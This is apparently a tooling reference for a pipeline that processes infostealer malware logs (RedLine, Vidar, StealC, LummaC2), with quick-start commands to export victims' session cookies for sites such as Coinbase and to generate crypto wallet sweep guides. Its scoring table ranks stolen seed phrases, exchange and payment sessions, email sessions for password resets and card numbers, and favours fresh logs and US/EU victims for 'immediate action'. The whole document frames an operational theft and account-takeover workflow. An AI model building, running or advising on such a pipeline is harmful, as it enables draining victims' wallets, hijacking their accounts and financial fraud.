# Stealer Log Pipeline — Tooling Reference

Full parsing + analysis pipeline at `${MY_REPOS}\Documents\github\relay-pool\stealer-pipeline\`.

## Components

| Tool | Purpose | Path |
|------|---------|------|
| `master.py` | Orchestrator — ingest, analyze, export, wallets | `stealer-pipeline/master.py` |
| `pipeline.sh` | Convenience wrapper | `stealer-pipeline/pipeline.sh` |
| `scripts/find-valuable-logs.py` | Score logs by extractable value | `stealer-pipeline/scripts/` |
| `scripts/export-cookies.py` | Export cookies to Netscape .txt for EditThisCookie import | `stealer-pipeline/scripts/` |
| `scripts/sweep-wallets.py` | Identify wallets + per-type sweep instructions | `stealer-pipeline/scripts/` |
| `valtik-stealerlogs` | Parses 8 stealer families (RedLine, Vidar, StealC, LummaC2, +4) | PyPI / GitHub |

## Quick Start

```bash
cd ${MY_REPOS}/relay-pool/stealer-pipeline
bash pipeline.sh full /path/to/logs.zip      # Full pipeline
bash pipeline.sh analyze --min-score=100      # ★ targets only
bash pipeline.sh cook --domain=coinbase       # Export session cookies
bash pipeline.sh wallets                      # Wallet sweep guide
```

## Scoring Thresholds

- **★ 100+** — Immediate action. Seed phrases, exchange sessions, fresh.
- **● 50-99** — High value. Process today.
- **○ <50** — Potential. Batch later.

## Value Signals (weighted)

| Signal | Points | Notes |
|--------|--------|-------|
| Seed phrase | 60 | Instant wallet sweep — 30 seconds |
| Crypto wallet | 50 | File or wallet_type match |
| Exchange cookie | 35 | Coinbase, Binance, Kraken |
| Wallet file | 40 | .dat, .wallet, .json, .key |
| Payment cookie | 20 | PayPal, Amazon, Stripe |
| Email session | 10 | Gmail, Outlook — password resets |
| Telegram session | 15 | Full chat access |
| Card autofill | 8 | Credit card numbers |
| Discord token | 5 | Per token |
| Freshness | 15 | < 24h old |
| Geo | 10 | US/EU victim |

## Database

`corpus.db` (SQLite) — tables: entries, credentials, cookies, autofills, wallets, files, telegram_sessions, discord_tokens.

## Source

Built from `valtik-stealerlogs` (MIT, TreRB/stealerlogs). Pipeline assembled 2026-06-06.
